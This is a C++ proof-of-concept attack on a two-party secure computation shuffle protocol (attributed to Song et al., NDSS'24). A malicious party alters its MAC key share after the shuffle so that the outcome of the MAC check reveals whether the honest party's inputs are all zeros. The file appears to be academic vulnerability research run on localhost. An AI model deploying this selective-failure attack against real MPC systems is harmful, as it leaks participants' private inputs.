// Attack PoC: Input-Guessing Vulnerability in Song et al. NDSS'24 Shuffle
//
// Run against NDSS_online_example (the honest party).
// See docs/attack.md for instructions.

#include <future>

#include "absl/strings/str_split.h"
#include "llvm/Support/CommandLine.h"
#include "mosac/context/register.h"
#include "mosac/ss/protocol.h"

using namespace mosac;

llvm::cl::opt<std::string> cl_parties(
    "parties", llvm::cl::init("127.0.0.1:39530,127.0.0.1:39531"),
    llvm::cl::desc("server list"));

llvm::cl::opt<uint32_t> cl_rank("rank", llvm::cl::init(0),
                                llvm::cl::desc("self rank"));

llvm::cl::opt<uint32_t> cl_input_mode(
    "input_mode", llvm::cl::init(0),
    llvm::cl::desc("0 = random inputs, 1 = all zeros"));

constexpr uint32_t T = 8;
constexpr uint32_t NUM = 16;

struct ArgPack {
  uint32_t T, num, CR_mode, cache;
  bool operator==(const ArgPack &o) const {
    return T == o.T && num == o.num && CR_mode == o.CR_mode && cache == o.cache;
  }
};

void SyncTask(const std::shared_ptr<yacl::link::Context> &lctx) {
  ArgPack tmp = {T, NUM, 0, 0};
  auto bv = yacl::ByteContainerView(&tmp, sizeof(tmp));
  ArgPack remote;
  if (lctx->Rank()) {
    lctx->SendAsync(lctx->NextRank(), bv, "Sync0");
    auto buf = lctx->Recv(lctx->NextRank(), "Sync1");
    memcpy(&remote, buf.data(), buf.size());
  } else {
    auto buf = lctx->Recv(lctx->NextRank(), "Sync0");
    lctx->SendAsync(lctx->NextRank(), bv, "Sync1");
    memcpy(&remote, buf.data(), buf.size());
  }
  YACL_ENFORCE(remote == tmp);
}

std::shared_ptr<yacl::link::Context> MakeLink(const std::string &parties,
                                              size_t rank) {
  yacl::link::ContextDesc lctx_desc;
  std::vector<std::string> hosts = absl::StrSplit(parties, ',');
  for (size_t i = 0; i < hosts.size(); i++) {
    lctx_desc.parties.emplace_back(fmt::format("party{}", i), hosts[i]);
  }
  auto lctx = yacl::link::FactoryBrpc().CreateContext(lctx_desc, rank);
  lctx->ConnectToMesh();
  return lctx;
}

// ============================================================================
// ATTACK IMPLEMENTATION
// ============================================================================

void RunAttack(const std::shared_ptr<yacl::link::Context> &lctx,
               uint32_t input_mode) {
  auto context = std::make_shared<Context>(lctx);
  SetupContext(context, false);

  auto prot = context->GetState<Protocol>();
  auto cr = context->GetState<Correlation>();

  // Step 1: Generate input shares - either random or all zeros based on input_mode
  std::vector<ATy> shares;
  if (input_mode == 0) {
    shares = prot->RandA(NUM);
  } else {
    shares = prot->ZerosA(NUM);
  }

  // Step 2: Run the shuffle protocol honestly
  auto shuffle = prot->ShuffleA_2k(T, shares);

  // Step 3: ATTACK - Modify our MAC key share by +1
  // This causes a mismatch between the key used for the original input shares
  // and the key used for the upcoming MAC check.
  SPDLOG_WARN("Modifying MAC key by +1 and running MAC check...");
  PTy new_key = prot->GetKey() + PTy(1);
  prot->SetKey(new_key);
  cr->SetKey(new_key);

  // Step 4: Run the MAC check - result depends on whether inputs are zero
  bool check_passed = prot->NdssDelayCheck();

  // Step 5: Selective failure: information about the honest party's inputs
  if (check_passed) {
    SPDLOG_WARN("MAC check PASSED => inputs are ALL ZEROS");
    // Continue protocol normally
    prot->A2P(shuffle);
    prot->A2P(shares);
  } else {
    SPDLOG_WARN("MAC check FAILED => inputs are NON-ZERO");
    // Honest party aborted, no point continuing
  }
}

int main(int argc, char **argv) {
  llvm::cl::ParseCommandLineOptions(argc, argv);

  SPDLOG_INFO("Running attack (inputs: {})",
              cl_input_mode.getValue() == 0 ? "random" : "zeros");

  auto lctx = MakeLink(cl_parties.getValue(), cl_rank.getValue());
  SyncTask(lctx);
  RunAttack(lctx, cl_input_mode.getValue());

  return 0;
}
